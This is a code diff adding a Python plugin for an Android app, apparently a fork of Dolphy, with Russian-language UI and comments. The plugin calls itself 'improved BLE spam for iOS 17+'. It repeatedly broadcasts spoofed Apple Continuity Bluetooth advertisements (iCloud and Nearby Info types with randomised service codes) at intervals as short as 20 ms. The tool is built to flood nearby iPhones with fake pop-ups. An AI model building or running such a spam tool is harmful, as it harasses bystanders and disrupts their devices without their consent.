@@ -1,0 +1,341 @@
+import random
+import threading
+import time
+
+__id__ = "icloud_spoof"
+__name__ = "iCloud Spoof"
+__version__ = "1.0.0"
+__author__ = "winterballs"
+__description__ = "Улучшенный BLE-спам для iOS 17+ через iCloud и Nearby Info"
+__icon__ = "rounded:cloud"
+__permissions__ = ["ble_spam", "bluetooth"]
+
+APPLE_COMPANY_ID = 0x004C
+ICLOUD_TYPE = "0D"
+ICLOUD_SIZE = "16"
+NEARBY_TYPE = "10"
+NEARBY_SIZE = "15"
+
+FORK_URL = "https://github.com/winterballs/Dolphy-App-Improved"
+FORK_NAME = "dolphy-app-improved (testing)"
+
+BLINK_ON_COLOR = "#00FF00"
+BLINK_OFF_COLOR = "#808080"
+
+MAX_DELAY_MS = 300
+MIN_DELAY_MS = 20
+UI_REFRESH_INTERVAL = 0.15
+MAX_LOG_LINES = 20
+
+ICLOUD_SERVICES = {
+    "01": "iCloud Keychain", "02": "iCloud Photos", "03": "iCloud Drive",
+    "04": "Find My", "05": "iCloud Backup", "06": "iCloud Mail",
+    "07": "iCloud Contacts", "08": "iCloud Calendar", "09": "iCloud Notes",
+    "0A": "iCloud Reminders", "0B": "Sign in with Apple", "0C": "Apple ID Verification",
+    "0D": "iCloud Settings", "0E": "Two-Factor Auth",
+}
+
+NEARBY_INFO_SERVICES = {
+    "01": "Nearby Info — Общее", "02": "Nearby Info — iCloud",
+    "03": "Nearby Info — Handoff", "04": "Nearby Info — Continuity Camera",
+    "05": "Nearby Info — Sidecar",
+}
+
+
+class ICloudSpoof(BasePlugin):
+    MODE_ICLOUD = "icloud_spoof"
+    MODE_NEARBY = "nearby_info_spoof"
+
+    def __init__(self):
+        super().__init__()
+        self._ready = False
+        self.stop_event = threading.Event()
+        self.worker = None
+        self.blink_thread = None
+        self.active_mode = None
+        self.delay_ms = 100
+        self.sent_count = 0
+        self.icloud_count = 0
+        self.nearby_count = 0
+        self.last_service = ""
+        self.last_error = ""
+        self.blink_on = False
+        self._last_ui_refresh = 0.0
+        self._last_tick = 0.0
+        self.logs = []
+
+    def _log(self, msg):
+        try:
+            stamp = time.strftime("%H:%M:%S")
+            self.logs.append(stamp + "  " + msg)
+            if len(self.logs) > MAX_LOG_LINES:
+                self.logs = self.logs[-MAX_LOG_LINES:]
+        except Exception:
+            pass
+
+    def on_plugin_load(self):
+        self._ready = True
+        self._log("plugin loaded")
+        try:
+            self.add_module("iCloud Spoof",
+                "Улучшенный BLE-спам для iOS 17+: iCloud и Nearby Info",
+                "cloud", "main", "OTHER", 5)
+        except Exception as e:
+            self.toast("module: " + str(e))
+        try:
+            self.register_ble_mode(self.MODE_ICLOUD, "iCloud Spoof",
+                                   "Сервисы iCloud для iOS 17+", "cloud", 10)
+        except Exception:
+            pass
+        try:
+            self.register_ble_mode(self.MODE_NEARBY, "Nearby Info",
+                                   "Сервисы Nearby Info для iOS 17+", "sensors", 11)
+        except Exception:
+            pass
+
+    def on_ble_mode_start(self, payload):
+        if not self._ready:
+            return
+        try:
+            mode_id = payload.get("modeId", "")
+        except Exception:
+            mode_id = ""
+        self._log("mode_start: " + str(mode_id))
+        if mode_id == self.MODE_ICLOUD:
+            self._start(self.MODE_ICLOUD)
+        elif mode_id == self.MODE_NEARBY:
+            self._start(self.MODE_NEARBY)
+
+    def on_ble_mode_delay_changed(self, payload):
+        try:
+            mode_id = payload.get("modeId", "")
+            if mode_id in (self.MODE_ICLOUD, self.MODE_NEARBY):
+                self.delay_ms = max(MIN_DELAY_MS, min(MAX_DELAY_MS, int(payload.get("delayMs", self.delay_ms))))
+        except Exception:
+            pass
+
+    def on_ble_mode_stop(self, payload):
+        try:
+            mode_id = payload.get("modeId", "")
+        except Exception:
+            mode_id = ""
+        self._log("mode_stop: " + str(mode_id))
+        if mode_id in (self.MODE_ICLOUD, self.MODE_NEARBY):
+            self._stop()
+
+    def on_plugin_unload(self):
+        self._log("unload")
+        self._stop()
+        self._ready = False
+
+    def _start(self, mode):
+        self._stop()
+        self.active_mode = mode
+        self.stop_event.clear()
+        self.sent_count = 0
+        self.icloud_count = 0
+        self.nearby_count = 0
+        self.last_error = ""
+        self.blink_on = False
+        self._last_ui_refresh = 0.0
+        self._last_tick = 0.0
+        self._log("start " + mode)
+        self.worker = threading.Thread(target=self._advertising_loop, daemon=True)
+        self.worker.start()
+        self.blink_thread = threading.Thread(target=self._blink_loop, daemon=True)
+        self.blink_thread.start()
+        self._safe_refresh()
+
+    def _stop(self):
+        self.stop_event.set()
+        self.active_mode = None
+        self._safe_refresh()
+
+    def _blink_loop(self):
+        while self.active_mode is not None and not self.stop_event.is_set():
+            self.blink_on = not self.blink_on
+            time.sleep(0.5)
+
+    def _safe_refresh(self):
+        try:
+            self.refresh()
+        except Exception:
+            pass
+
+    def _throttled_refresh(self):
+        now = time.monotonic()
+        if now - self._last_tick >= 3.0:
+            self._last_tick = now
+            self._log("tick: total=" + str(self.sent_count) + " i=" + str(self.icloud_count) + " n=" + str(self.nearby_count))
+        if now - self._last_ui_refresh >= UI_REFRESH_INTERVAL:
+            self._last_ui_refresh = now
+            self._safe_refresh()
+
+    def _advertising_loop(self):
+        android = self.api.getAndroid()
+        while not self.stop_event.is_set():
+            if self.active_mode is None:
+                break
+            ok = False
+            try:
+                if self.active_mode == self.MODE_ICLOUD:
+                    service = random.choice(list(ICLOUD_SERVICES.keys()))
+                    payload = self._build_icloud_payload(service)
+                    self.last_service = ICLOUD_SERVICES.get(service, service)
+                else:
+                    service = random.choice(list(NEARBY_INFO_SERVICES.keys()))
+                    payload = self._build_nearby_payload(service)
+                    self.last_service = NEARBY_INFO_SERVICES.get(service, service)
+                ok = bool(android.bleAdvertiseStart(APPLE_COMPANY_ID, payload, False, False))
+            except Exception as e:
+                self.last_error = "start: " + str(e)
+                ok = False
+
+            if ok:
+                self.sent_count += 1
+                if self.active_mode == self.MODE_ICLOUD:
+                    self.icloud_count += 1
+                else:
+                    self.nearby_count += 1
+
+            self._throttled_refresh()
+            time.sleep(max(0.02, self.delay_ms / 1000.0))
+
+    def _build_icloud_payload(self, service_hex):
+        random_part = "".join(random.choice("0123456789ABCDEF") for _ in range(40))
+        return ICLOUD_TYPE + ICLOUD_SIZE + service_hex + random_part
+
+    def _build_nearby_payload(self, service_hex):
+        status = format(random.randint(0, 255), "02X")
+        random_part = "".join(random.choice("0123456789ABCDEF") for _ in range(36))
+        return NEARBY_TYPE + NEARBY_SIZE + service_hex + status + random_part
+
+    def _toggle(self, mode):
+        if self.active_mode == mode:
+            self._stop()
+        else:
+            self._start(mode)
+
+    def _on_speed_change(self, value):
+        try:
+            self.delay_ms = max(MIN_DELAY_MS, min(MAX_DELAY_MS, int(value)))
+            self._safe_refresh()
+        except Exception:
+            pass
+
+    def _icon_tint(self, is_active):
+        if is_active and self.blink_on:
+            return BLINK_ON_COLOR
+        if is_active:
+            return BLINK_OFF_COLOR
+        return None
+
+    def _speed_label(self):
+        if self.delay_ms <= 50:
+            return "очень быстро"
+        if self.delay_ms <= 100:
+            return "быстро"
+        if self.delay_ms <= 200:
+            return "средне"
+        return "медленно"
+
+    def _speed_bar(self):
+        ratio = 1.0 - ((self.delay_ms - MIN_DELAY_MS) / float(MAX_DELAY_MS - MIN_DELAY_MS))
+        ratio = max(0.0, min(1.0, ratio))
+        filled = int(round(ratio * 10))
+        return "█" * filled + "░" * (10 - filled)
+
+    def _action_button(self, ui, title, description, icon, tint, on_click):
+        return ui.card([
+            ui.row([
+                ui.icon(icon, 28, tint),
+                ui.column([
+                    ui.text(title, "titleMedium"),
+                    ui.text(description, "bodySmall", color="muted"),
+                ], spacing=2),
+            ], spacing=14),
+        ], padding=14, on_click=on_click)
+
+    def _centered_slider(self, ui):
+        return ui.column([
+            ui.row([
+                ui.spacer(width=18),
+                ui.slider(
+                    value=self.delay_ms,
+                    on_change=self._on_speed_change,
+                    minimum=MIN_DELAY_MS,
+                    maximum=MAX_DELAY_MS,
+                    steps=28,
+                ),
+                ui.spacer(width=30),
+            ], spacing=0, padding=0),
+        ], padding=8)
+
+    def screen_main(self, ui, api, state):
+        try:
+            is_icloud = self.active_mode == self.MODE_ICLOUD
+            is_nearby = self.active_mode == self.MODE_NEARBY
+            running = is_icloud or is_nearby
+            status_text = "● Работает" if running else "○ Остановлено"
+
+            icloud_desc = "Нажмите, чтобы остановить" if is_icloud else "Нажмите для запуска"
+            nearby_desc = "Нажмите, чтобы остановить" if is_nearby else "Нажмите для запуска"
+
+            status_card_children = [
+                ui.text("Статус: " + status_text, "titleMedium"),
+                ui.text("Всего пакетов: " + str(self.sent_count), "bodyMedium"),
+                ui.text("iCloud: " + str(self.icloud_count) + "  ·  Nearby Info: " + str(self.nearby_count), "bodyMedium"),
+                ui.text("Последний сервис: " + (self.last_service or "—"), "bodySmall"),
+            ]
+            if self.last_error:
+                status_card_children.append(ui.text("Ошибка: " + self.last_error, "bodySmall", color="#FF4444"))
+
+            log_text = "\n".join(self.logs) if self.logs else "—"
+
+            children = [
+                ui.text(
+                    "Улучшенный BLE-спам для iOS 17+. Эмулирует сервисы Apple "
+                    "Continuity: iCloud Keychain, Find My, Handoff, Continuity Camera.",
+                    "bodyMedium",
+                ),
+                ui.card(status_card_children, padding=16),
+                ui.text("Задержка между пакетами (мс)", "titleSmall"),
+                self._centered_slider(ui),
+                ui.text(
+                    "Текущее: " + str(self.delay_ms) + " мс  ·  " + self._speed_label(),
+                    "bodySmall",
+                    color="muted",
+                ),
+                ui.text(self._speed_bar(), "titleMedium"),
+                self._action_button(ui, "iCloud Spoof", icloud_desc, "bluetooth",
+                                    self._icon_tint(is_icloud), lambda: self._toggle(self.MODE_ICLOUD)),
+                self._action_button(ui, "Nearby Info", nearby_desc, "bluetooth",
+                                    self._icon_tint(is_nearby), lambda: self._toggle(self.MODE_NEARBY)),
+                ui.spacer(height=8),
+                ui.text("Логи (последние 20)", "titleSmall"),
+                ui.log_panel(log_text, max_height=200),
+                ui.spacer(height=8),
+                ui.text(
+                    "Внимание: iCloud Spoof нацелен на iOS 17+. На старых "
+                    "версиях (iOS 15/16) используйте классические Apple-режимы.",
+                    "bodySmall",
+                    color="muted",
+                ),
+                ui.divider(),
+                ui.text(FORK_NAME, "titleSmall"),
+                self._action_button(ui, "Открыть на GitHub", FORK_URL, "link", None,
+                                    lambda: api.getAndroid().openUrl(FORK_URL)),
+            ]
+
+            return ui.scaffold(
+                title="iCloud Spoof",
+                content=ui.lazy_column(children, padding=16, spacing=12),
+            )
+        except Exception as e:
+            return ui.scaffold(title="Ошибка", content=ui.text(str(e)))
+
+#молодёжный коментарий
+#я кстати форк сделал на dolphy-app
+#там баги фиксанул потихоньку
+#две настройки новые добавил
+#вот так вот
